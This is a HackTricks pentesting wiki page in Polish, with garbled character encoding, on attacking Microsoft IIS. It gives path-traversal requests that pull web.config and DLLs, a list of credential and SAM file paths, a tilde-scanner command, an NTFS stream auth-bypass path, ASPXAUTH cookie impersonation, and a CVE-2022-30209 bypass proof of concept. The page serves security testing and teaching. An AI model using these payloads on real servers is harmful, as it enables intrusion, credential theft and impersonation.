# IIS - Internet Information Services

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Testuj rozszerzenia plikÃ³w wykonywalnych:

* asp
* aspx
* config
* php

## Ujawnienie wewnÄ™trznego adresu IP

Na kaÅ¼dym serwerze IIS, na ktÃ³rym otrzymasz 302, moÅ¼esz sprÃ³bowaÄ‡ usunÄ…Ä‡ nagÅ‚Ã³wek Host i uÅ¼yÄ‡ HTTP/1.0, a w odpowiedzi nagÅ‚Ã³wek Location moÅ¼e wskazywaÄ‡ na wewnÄ™trzny adres IP:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
OdpowiedÅº ujawniajÄ…ca wewnÄ™trzny adres IP:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Wykonywanie plikÃ³w .config

MoÅ¼esz przesyÅ‚aÄ‡ pliki .config i uÅ¼ywaÄ‡ ich do wykonywania kodu. Jednym ze sposobÃ³w jest dodanie kodu na koÅ„cu pliku wewnÄ…trz komentarza HTML: [Pobierz przykÅ‚ad tutaj](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

WiÄ™cej informacji i technik dotyczÄ…cych wykorzystania tej podatnoÅ›ci [tutaj](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## Bruteforce odkrywania IIS

Pobierz listÄ™, ktÃ³rÄ… stworzyÅ‚em:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

ZostaÅ‚a stworzona poprzez poÅ‚Ä…czenie zawartoÅ›ci nastÄ™pujÄ…cych list:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

UÅ¼yj jej bez dodawania jakiegoÅ› rozszerzenia, pliki, ktÃ³re go potrzebujÄ…, juÅ¼ je majÄ….

## Przechodzenie po Å›cieÅ¼kach

### Wyciekanie kodu ÅºrÃ³dÅ‚owego

SprawdÅº peÅ‚ny opis w: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
PodsumowujÄ…c, w folderach aplikacji znajduje siÄ™ kilka plikÃ³w web.config z odniesieniami do plikÃ³w "**assemblyIdentity**" i "**namespaces**". DziÄ™ki tym informacjom moÅ¼liwe jest ustalenie **gdzie znajdujÄ… siÄ™ pliki wykonywalne** i ich pobranie.\
Z **pobranych Dll** moÅ¼na rÃ³wnieÅ¼ znaleÅºÄ‡ **nowe przestrzenie nazw**, do ktÃ³rych naleÅ¼y sprÃ³bowaÄ‡ uzyskaÄ‡ dostÄ™p i pobraÄ‡ plik web.config, aby znaleÅºÄ‡ nowe przestrzenie nazw i assemblyIdentity.\
Ponadto pliki **connectionstrings.config** i **global.asax** mogÄ… zawieraÄ‡ interesujÄ…ce informacje.\\
{% endhint %}

W **aplikacjach .Net MVC**, plik **web.config** odgrywa kluczowÄ… rolÄ™, okreÅ›lajÄ…c kaÅ¼dy plik binarny, na ktÃ³rym opiera siÄ™ aplikacja, za pomocÄ… tagÃ³w XML **"assemblyIdentity"**.

### **Eksploracja plikÃ³w binarnych**

PrzykÅ‚ad dostÄ™pu do pliku **web.config** pokazano poniÅ¼ej:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
To Å¼Ä…danie ujawnia rÃ³Å¼ne ustawienia i zaleÅ¼noÅ›ci, takie jak:

* **EntityFramework** wersja
* **AppSettings** dla stron internetowych, walidacji klienta i JavaScript
* **System.web** konfiguracje dla uwierzytelniania i czasu wykonywania
* **System.webServer** ustawienia moduÅ‚Ã³w
* **Runtime** powiÄ…zania zestawÃ³w dla licznych bibliotek, takich jak **Microsoft.Owin**, **Newtonsoft.Json** i **System.Web.Mvc**

Te ustawienia wskazujÄ…, Å¼e niektÃ³re pliki, takie jak **/bin/WebGrease.dll**, znajdujÄ… siÄ™ w folderze /bin aplikacji.

### **Pliki katalogu gÅ‚Ã³wnego**

Pliki znajdujÄ…ce siÄ™ w katalogu gÅ‚Ã³wnym, takie jak **/global.asax** i **/connectionstrings.config** (ktÃ³ry zawiera wraÅ¼liwe hasÅ‚a), sÄ… niezbÄ™dne dla konfiguracji i dziaÅ‚ania aplikacji.

### **Przestrzenie nazw i Web.Config**

Aplikacje MVC definiujÄ… rÃ³wnieÅ¼ dodatkowe **web.config files** dla specyficznych przestrzeni nazw, aby uniknÄ…Ä‡ powtarzalnych deklaracji w kaÅ¼dym pliku, co ilustruje Å¼Ä…danie pobrania innego **web.config**:
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **Pobieranie DLL**

Wzmianka o niestandardowej przestrzeni nazw sugeruje istnienie DLL o nazwie "**WebApplication1**" w katalogu /bin. NastÄ™pnie pokazano Å¼Ä…danie pobrania **WebApplication1.dll**:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
To sugeruje obecnoÅ›Ä‡ innych istotnych DLL, takich jak **System.Web.Mvc.dll** i **System.Web.Optimization.dll**, w katalogu /bin.

W scenariuszu, w ktÃ³rym DLL importuje przestrzeÅ„ nazw o nazwie **WebApplication1.Areas.Minded**, atakujÄ…cy moÅ¼e wywnioskowaÄ‡ istnienie innych plikÃ³w web.config w przewidywalnych Å›cieÅ¼kach, takich jak **/area-name/Views/**, zawierajÄ…cych specyficzne konfiguracje i odniesienia do innych DLL w folderze /bin. Na przykÅ‚ad, Å¼Ä…danie do **/Minded/Views/web.config** moÅ¼e ujawniÄ‡ konfiguracje i przestrzenie nazw, ktÃ³re wskazujÄ… na obecnoÅ›Ä‡ innego DLL, **WebApplication1.AdditionalFeatures.dll**.

### Common files

From [here](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Error

JeÅ›li zobaczysz bÅ‚Ä…d podobny do poniÅ¼szego:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

Oznacza to, Å¼e serwer **nie otrzymaÅ‚ poprawnej nazwy domeny** w nagÅ‚Ã³wku Host.\
Aby uzyskaÄ‡ dostÄ™p do strony internetowej, moÅ¼esz spojrzeÄ‡ na serwowany **certyfikat SSL** i byÄ‡ moÅ¼e znajdziesz tam nazwÄ™ domeny/poddomeny. JeÅ›li jej tam nie ma, moÅ¼e byÄ‡ konieczne **brute force VHosts**, aÅ¼ znajdziesz poprawnÄ….

## Stare luki w IIS, na ktÃ³re warto zwrÃ³ciÄ‡ uwagÄ™

### Microsoft IIS tilde character â€œ\~â€ Vulnerability/Feature â€“ Short File/Folder Name Disclosure

MoÅ¼esz sprÃ³bowaÄ‡ **enumerowaÄ‡ foldery i pliki** w kaÅ¼dym odkrytym folderze (nawet jeÅ›li wymaga to podstawowej autoryzacji) uÅ¼ywajÄ…c tej **techniki**.\
GÅ‚Ã³wnym ograniczeniem tej techniki, jeÅ›li serwer jest podatny, jest to, Å¼e **moÅ¼e znaleÅºÄ‡ tylko pierwsze 6 liter nazwy kaÅ¼dego pliku/folderu oraz pierwsze 3 litery rozszerzenia** plikÃ³w.

MoÅ¼esz uÅ¼yÄ‡ [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) do testowania tej luki: `java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (844).png>)

Oryginalne badania: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ **metasploit**: `use scanner/http/iis_shortname_scanner`

### Basic Authentication bypass

**ObejdÅº** podstawowÄ… autoryzacjÄ™ (**IIS 7.5**) prÃ³bujÄ…c uzyskaÄ‡ dostÄ™p do: `/admin:$i30:$INDEX_ALLOCATION/admin.php` lub `/admin::$INDEX_ALLOCATION/admin.php`

MoÅ¼esz sprÃ³bowaÄ‡ **poÅ‚Ä…czyÄ‡** tÄ™ **lukÄ™** z ostatniÄ…, aby znaleÅºÄ‡ nowe **foldery** i **obejÅ›Ä‡** autoryzacjÄ™.

## ASP.NET Trace.AXD enabled debugging

ASP.NET zawiera tryb debugowania, a jego plik nazywa siÄ™ `trace.axd`.

Zachowuje bardzo szczegÃ³Å‚owy dziennik wszystkich Å¼Ä…daÅ„ wysyÅ‚anych do aplikacji przez pewien czas.

Informacje te obejmujÄ… adresy IP zdalnych klientÃ³w, identyfikatory sesji, wszystkie ciasteczka Å¼Ä…daÅ„ i odpowiedzi, Å›cieÅ¼ki fizyczne, informacje o kodzie ÅºrÃ³dÅ‚owym, a potencjalnie nawet nazwy uÅ¼ytkownikÃ³w i hasÅ‚a.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH uÅ¼ywa nastÄ™pujÄ…cych informacji:

* **`validationKey`** (string): klucz zakodowany w formacie hex do uÅ¼ycia w walidacji podpisu.
* **`decryptionMethod`** (string): (domyÅ›lnie â€œAESâ€).
* **`decryptionIV`** (string): wektor inicjalizacyjny zakodowany w formacie hex (domyÅ›lnie wektor zerowy).
* **`decryptionKey`** (string): klucz zakodowany w formacie hex do uÅ¼ycia w deszyfrowaniu.

Jednak niektÃ³rzy ludzie bÄ™dÄ… uÅ¼ywaÄ‡ **domyÅ›lnych wartoÅ›ci** tych parametrÃ³w i bÄ™dÄ… uÅ¼ywaÄ‡ jako **ciasteczka adresu e-mail uÅ¼ytkownika**. Dlatego, jeÅ›li moÅ¼esz znaleÅºÄ‡ stronÄ™ internetowÄ… korzystajÄ…cÄ… z **tej samej platformy**, ktÃ³ra uÅ¼ywa ciasteczka ASPXAUTH i **utworzysz uÅ¼ytkownika z adresem e-mail uÅ¼ytkownika, ktÃ³rego chcesz udawaÄ‡** na serwerze pod atakiem, moÅ¼esz byÄ‡ w stanie **uÅ¼yÄ‡ ciasteczka z drugiego serwera w pierwszym** i udawaÄ‡ uÅ¼ytkownika.\
Ten atak zadziaÅ‚aÅ‚ w tym [**opisie**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## IIS Authentication Bypass with cached passwords (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[PeÅ‚ny raport tutaj](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): BÅ‚Ä…d w kodzie **nie sprawdzaÅ‚ poprawnie hasÅ‚a podanego przez uÅ¼ytkownika**, wiÄ™c atakujÄ…cy, ktÃ³rego **hash hasÅ‚a trafia na klucz**, ktÃ³ry juÅ¼ znajduje siÄ™ w **pamiÄ™ci podrÄ™cznej**, bÄ™dzie mÃ³gÅ‚ zalogowaÄ‡ siÄ™ jako ten uÅ¼ytkownik.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
